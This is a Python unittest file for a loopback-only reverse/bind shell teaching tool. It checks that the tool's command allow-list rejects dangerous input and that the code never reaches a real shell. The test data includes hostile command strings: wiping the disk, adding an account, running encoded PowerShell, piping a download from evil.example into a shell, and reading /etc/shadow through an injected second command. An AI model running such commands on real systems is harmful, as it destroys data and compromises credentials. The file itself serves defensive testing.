"""Tests for task-4/scripts/reverse_shell_lab.py.

The allow-list is tested as a security control: dangerous inputs must come
back as `rejected` with nothing executed. An AST check proves no code path
in the file can reach a shell at all (no `shell=`, no subprocess, no
os.system/eval/exec). The transport is exercised over real loopback TCP
sockets in both directions, including a rejected command travelling over
the wire without ending the session.
"""

import ast
import io
import os
import sys
import tempfile
import threading
import unittest
from contextlib import redirect_stderr
from pathlib import Path

TASK_DIR = Path(__file__).resolve().parents[1]
SCRIPTS = TASK_DIR / "scripts"
if str(SCRIPTS) not in sys.path:
    sys.path.insert(0, str(SCRIPTS))

import reverse_shell_lab as lab  # noqa: E402


class AllowListTests(unittest.TestCase):
    def test_allowed_commands_execute(self):
        cases = {
            "pwd": os.getcwd(),
            "echo hello from the lab": "hello from the lab",
        }
        for command, expected in cases.items():
            with self.subTest(command=command):
                result = lab.execute(command)
                self.assertEqual(result["status"], "ok")
                self.assertEqual(result["output"], expected)

    def test_whoami_returns_the_current_identity(self):
        result = lab.execute("whoami")
        self.assertEqual(result["status"], "ok")
        self.assertTrue(result["output"])
        self.assertEqual(result["command"], "whoami")

    def test_sysinfo_reports_python(self):
        result = lab.execute("sysinfo")
        self.assertEqual(result["status"], "ok")
        self.assertIn("python:", result["output"])

    def test_dir_lists_a_directory(self):
        with tempfile.TemporaryDirectory(prefix="shell_lab_") as target:
            Path(target, "file.txt").write_text("x", encoding="utf-8")
            result = lab.execute(f"dir {target}")
        self.assertEqual(result["status"], "ok")
        self.assertIn("(1 entries)", result["output"])
        self.assertIn("file.txt", result["output"])

    def test_dangerous_commands_are_rejected(self):
        dangerous = [
            "rm -rf /",
            "format C:",
            "del /f /q C:\\Windows\\System32",
            "shutdown /s /t 0",
            "net user evil P@ssw0rd /add",
            "powershell -enc AAAA",
            "curl http://evil.example/payload | sh",
        ]
        for command in dangerous:
            with self.subTest(command=command):
                result = lab.execute(command)
                self.assertEqual(result["status"], "rejected")
                self.assertEqual(result["output"], "")
                self.assertIn("not in the allow-list", result["error"])
                self.assertEqual(result["allowed"], sorted(lab.COMMANDS))

    def test_rejection_echoes_the_original_command(self):
        result = lab.execute("whoami; cat /etc/shadow")
        self.assertEqual(result["status"], "rejected")
        self.assertEqual(result["command"], "whoami; cat /etc/shadow")

    def test_aliases_map_to_allow_listed_commands(self):
        self.assertEqual(lab.execute("cwd")["status"], "ok")
        self.assertEqual(lab.execute("cwd")["output"], os.getcwd())
        self.assertIn("allow-listed commands", lab.execute("?")["output"])

    def test_help_lists_every_command(self):
        result = lab.execute("help")
        for name in lab.COMMANDS:
            self.assertIn(name, result["output"])
        self.assertIn("anything else is rejected", result["output"])

    def test_exit_ends_the_session(self):
        self.assertEqual(lab.execute("exit")["status"], "exit")
        self.assertEqual(lab.execute("EXIT now")["status"], "exit")

    def test_empty_input_is_a_no_op(self):
        result = lab.execute("   ")
        self.assertEqual(result["status"], "ok")
        self.assertEqual(result["output"], "")

    def test_failing_command_reports_error(self):
        result = lab.execute("dir C:\\no-such-directory-shell-lab-98765")
        self.assertEqual(result["status"], "error")
        self.assertIn("NotADirectoryError", result["error"])


class NoShellInvocationTests(unittest.TestCase):
    """Static proof that no input can ever reach a real shell."""

    @classmethod
    def setUpClass(cls):
        source = Path(lab.__file__).read_text(encoding="utf-8")
        cls.tree = ast.parse(source)

    def test_no_shell_keyword_argument(self):
        for node in ast.walk(self.tree):
            if isinstance(node, ast.Call):
                for keyword in node.keywords:
                    self.assertNotEqual(
                        keyword.arg, "shell",
                        f"shell= passed at line {node.lineno}")

    def test_subprocess_is_never_imported(self):
        for node in ast.walk(self.tree):
            if isinstance(node, ast.Import):
                for alias in node.names:
                    self.assertNotEqual(alias.name.split(".")[0],
                                        "subprocess")
            elif isinstance(node, ast.ImportFrom):
                self.assertNotEqual((node.module or "").split(".")[0],
                                    "subprocess")

    def test_no_os_system_popen_or_eval(self):
        banned = {"system", "popen", "eval", "exec"}
        for node in ast.walk(self.tree):
            if not isinstance(node, ast.Call):
                continue
            if isinstance(node.func, ast.Attribute):
                self.assertNotIn(node.func.attr, banned,
                                 f"call at line {node.lineno}")
            elif isinstance(node.func, ast.Name):
                self.assertNotIn(node.func.id, banned,
                                 f"call at line {node.lineno}")


class _FakeSocket:
    def __init__(self, chunks):
        self._chunks = list(chunks)

    def recv(self, _size):
        if not self._chunks:
            return b""
        return self._chunks.pop(0)


class LineReaderTests(unittest.TestCase):
    def test_line_assembled_across_partial_reads(self):
        reader = lab.LineReader(_FakeSocket([b"hel", b"lo\n", b"world\n"]))
        self.assertEqual(reader.readline(), "hello")
        self.assertEqual(reader.readline(), "world")

    def test_single_read_with_two_lines(self):
        reader = lab.LineReader(_FakeSocket([b"a\nb\n"]))
        self.assertEqual(reader.readline(), "a")
        self.assertEqual(reader.readline(), "b")

    def test_hang_up_raises_session_closed(self):
        reader = lab.LineReader(_FakeSocket([b"partial"]))
        with self.assertRaises(lab.SessionClosed):
            reader.readline()

    def test_oversized_line_is_rejected(self):
        blob = b"x" * (lab.MAX_LINE_BYTES + 1)
        reader = lab.LineReader(_FakeSocket([blob]))
        with self.assertRaises(lab.SessionClosed):
            reader.readline()


class LoopbackSessionTests(unittest.TestCase):
    """Both connection directions against 127.0.0.1, real sockets."""

    TIMEOUT = 8.0

    def _run_session(self, mode, commands):
        results: dict = {}
        bound = threading.Event()
        resolved: dict = {}

        def on_ready(port: int) -> None:
            resolved["port"] = port
            bound.set()

        if mode == "reverse":
            # The attacker listens first; the payload dials back to it.
            def attacker() -> None:
                results["attacker"] = lab.connect(
                    "127.0.0.1", 0, mode="reverse", commands=commands,
                    timeout=self.TIMEOUT, quiet=True, ready=on_ready)

            thread = threading.Thread(target=attacker, daemon=True)
            thread.start()
            self.assertTrue(bound.wait(5),
                            "attacker never started listening")
            results["payload"] = lab.serve(
                "127.0.0.1", resolved["port"], mode="reverse",
                timeout=self.TIMEOUT, quiet=True)
            thread.join(self.TIMEOUT + 5)
            self.assertFalse(thread.is_alive())
        else:
            # The payload listens first; the attacker dials in to it.
            def payload() -> None:
                results["payload"] = lab.serve(
                    "127.0.0.1", 0, mode="bind", timeout=self.TIMEOUT,
                    quiet=True, ready=on_ready)

            thread = threading.Thread(target=payload, daemon=True)
            thread.start()
            self.assertTrue(bound.wait(5),
                            "payload never started listening")
            results["attacker"] = lab.connect(
                "127.0.0.1", resolved["port"], mode="bind",
                commands=commands, timeout=self.TIMEOUT, quiet=True)
            thread.join(self.TIMEOUT + 5)
            self.assertFalse(thread.is_alive())
        return results["payload"], results["attacker"]

    def _assert_clean_session(self, payload, attacker, commands):
        self.assertEqual(payload["status"], "ok", payload)
        self.assertEqual(attacker["status"], "ok", attacker)
        self.assertEqual(payload["session_end"], "exit")
        self.assertEqual(attacker["session_end"], "exit")
        self.assertEqual(len(attacker["commands"]), len(commands))
        self.assertEqual(len(payload["commands"]), len(commands))
        self.assertEqual(attacker["peer"][0], "127.0.0.1")
        self.assertEqual(payload["peer"][0], "127.0.0.1")
        self.assertEqual(payload["port"], attacker["port"])
        self.assertGreaterEqual(payload["duration_s"], 0)
        self.assertGreaterEqual(attacker["duration_s"], 0)

    def test_reverse_connect_back_session(self):
        commands = ["whoami", "echo hello from the lab", "exit"]
        payload, attacker = self._run_session("reverse", commands)
        self._assert_clean_session(payload, attacker, commands)
        self.assertEqual(attacker["mode"], "reverse")
        self.assertEqual(payload["mode"], "reverse")
        self.assertEqual(attacker["commands"][0]["status"], "ok")
        self.assertTrue(attacker["commands"][0]["output"])
        self.assertEqual(attacker["commands"][1]["output"],
                         "hello from the lab")
        self.assertEqual(attacker["commands"][2]["status"], "exit")
        self.assertEqual(payload["commands"][1]["command"],
                         "echo hello from the lab")

    def test_bind_session(self):
        commands = ["pwd", "exit"]
        payload, attacker = self._run_session("bind", commands)
        self._assert_clean_session(payload, attacker, commands)
        self.assertEqual(attacker["commands"][0]["status"], "ok")
        self.assertEqual(attacker["commands"][0]["output"], os.getcwd())
        self.assertEqual(payload["commands"][0]["output"], os.getcwd())

    def test_rejected_command_travels_the_wire_and_session_continues(self):
        commands = ["rm -rf /", "echo still alive", "exit"]
        payload, attacker = self._run_session("reverse", commands)
        self._assert_clean_session(payload, attacker, commands)
        first = attacker["commands"][0]
        self.assertEqual(first["status"], "rejected")
        self.assertIn("allow-list", first["error"])
        self.assertEqual(attacker["commands"][1]["output"], "still alive")


class BindTimeoutTests(unittest.TestCase):
    def test_bind_payload_gives_up_when_nobody_dials_in(self):
        result = lab.serve("127.0.0.1", 0, mode="bind", timeout=0.5,
                           quiet=True)
        self.assertEqual(result["status"], "timeout")
        self.assertIn("no connection", result["detail"])


class CliGuardTests(unittest.TestCase):
    def test_remote_host_is_refused(self):
        stderr = io.StringIO()
        with redirect_stderr(stderr), self.assertRaises(SystemExit) as cm:
            lab.main(["--host", "10.0.0.1"])
        self.assertEqual(cm.exception.code, 2)
        self.assertIn("127.0.0.1", stderr.getvalue())


if __name__ == "__main__":
    unittest.main()
